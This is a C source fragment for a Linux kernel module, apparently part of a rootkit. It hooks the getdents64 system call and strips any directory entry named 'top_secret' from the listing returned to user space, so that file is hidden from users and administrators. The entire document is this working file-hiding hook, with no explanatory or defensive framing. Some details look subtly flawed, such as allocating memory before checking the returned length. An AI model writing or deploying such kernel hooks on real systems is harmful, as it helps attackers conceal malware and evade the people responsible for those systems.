#include <linux/kallsyms.h>
#include <linux/dirent.h>

typedef unsigned long m_address;

#define HIDDEN_FILE_NAME "top_secret"

asmlinkage long (*getdents64)(const struct pt_regs *);

asmlinkage static int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *original_dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *previous_dir, *modified_dirent = NULL;
    m_address offset = 0;

    int ret = getdents64(regs);
    modified_dirent = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || modified_dirent == NULL)
        return ret;

    if (copy_from_user(modified_dirent, original_dirent, ret))
    {
        kfree(modified_dirent);
        return ret;
    }

    while (offset < ret)
    {
        current_dir = (void *)modified_dirent + offset;

        if (strcmp(HIDDEN_FILE_NAME, current_dir->d_name) == 0)
        {
            if (current_dir == modified_dirent)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
            }
            else
                previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
            previous_dir = current_dir;

        offset += current_dir->d_reclen;
    }

    if (copy_to_user(original_dirent, modified_dirent, ret))
    {
        kfree(modified_dirent);
        return ret;
    }

    kfree(modified_dirent);
    return ret;
}
